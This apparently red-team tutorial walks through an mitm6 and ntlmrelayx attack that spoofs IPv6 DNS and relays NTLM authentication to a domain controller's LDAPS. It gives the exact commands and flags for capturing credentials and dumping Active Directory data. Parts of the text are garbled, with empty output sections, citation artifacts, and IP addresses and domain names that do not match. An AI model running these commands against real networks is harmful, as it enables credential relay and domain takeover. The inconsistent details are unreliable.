## Overview

`mitm6` is a tool that exploits a fundamental design decision in Windows networking: **IPv6 is preferred over IPv4 by default on modern Windows systems**.

In many corporate environments, IPv6 is enabled but not properly configured. In most cases, **no legitimate DHCPv6 or DNSv6 server exists**, which creates a security gap. Attackers can abuse this gap to position themselves as the **authoritative DNS server** for an entire network segment.

When combined with Impacket’s `ntlmrelayx`, this technique becomes a powerful Active Directory attack chain:

- Capture NTLM authentication from Windows machines on the network
- Relay captured authentication to services such as **LDAP/LDAPS** on a Domain Controller
- Create new domain users or extract Active Directory data
- Relay to SMB services to access file shares or execute commands
- Ultimately escalate privileges and potentially achieve **Domain Admin access without cracking passwords**

This attack technique was originally researched and published by security researchers at :contentReference[oaicite:0]{index=0}, including :contentReference[oaicite:1]{index=1}. It remains one of the most impactful internal network attack methods against Active Directory environments.

## Attack Theory
Why IPv6?
Windows machines periodically broadcast DHCPv6 Solicit messages looking for an IPv6 gateway and DNS server. By default, these go unanswered on most enterprise networks. mitm6 responds to these broadcasts, assigning the attacker's link-local IPv6 address as the DNS server.

```
Victim  → DNS: "Where is wpad.corp.local?"
mitm6   → DNS: "It's at attacker's IP"
Victim  → HTTP: GET http://attacker/wpad.dat
ntlmrelayx → "Authenticate with NTLM!"
Victim  → [Sends NTLM handshake]
ntlmrelayx → [Relays to DC's LDAP]
DC      → [Authenticated!]
```

|-----------------|----------------------------------------------------|

```

# Attack Walkthrough
## Step 1 — Start mitm6
Open Terminal 1. Launch mitm6 targeting the internal domain on the network interface connected to the LAN.

```bash
sudo mitm6 -d readteambd.local -i eth0
```

| Flag |           Meaning                 |
|------|-----------------------------------|
| sudo | Run with root privileges          |
| mitm6| Starts IPv6 spoofing (DHCPv6/DNS) |
| -d   | Target domain                     |
| -i   | Network interface                 |
| eth0| Active LAN interface              |

### What Happens (mitm6 Flow)

- `mitm6` listens for **DHCPv6 Solicit** packets from Windows hosts  
- It replies with **DHCPv6 Advertise/Reply**, setting itself as the IPv6 DNS server  
- Victim machines automatically update their DNS configuration  
- All DNS queries are redirected to the attacker-controlled system  
- `mitm6` responds to **WPAD and internal domain queries**, forcing traffic toward the attacker IP  


## mitm6 output:

```

## Step 2 — Launch ntlmrelayx:
On another terminal
Run:

```bash
ntlmrelayx.py -6 -t ldaps://192.168.5.134 -wh fakewpad.readteambd.local -l lootme
```
```
|             Flag              |                      Meaning                         |
|-------------------------------|------------------------------------------------------|
| ntlmrelayx.py                 | NTLM authentication relay                            |
| -6                            | Enables listening on IPv6 as well as IPv4            |
| -t ldaps://192.168.5.130      | Relay target (LDAPS on Domain Controller)            |
| -wh fakewpad.readteambd.local | Serves a fake WPAD hostname to trigger authentication|
|-l lootme                      | Saves all captured/dumped data to local directory    |
```

## ntlmrelayx startup output:

## Step 3 — Trigger Authentication from Victim

On the victim machine (Windows 10), simply restart the machine.
Windows will automatically:

- 1. Send a DHCPv6 Solicit — mitm6 responds
- 2. Query DNS for WPAD — mitm6 answers, pointing to the attacker
- 3. Windows attempts to fetch http://fakewpad.roadteambd.local/wpad.dat
- 4. ntlmrelayx demands NTLM authentication
- 5. Windows transparently authenticates using the logged-in user's credentials

> *"No user interaction is required once the victim logs into Windows. The attack is completely silent."*
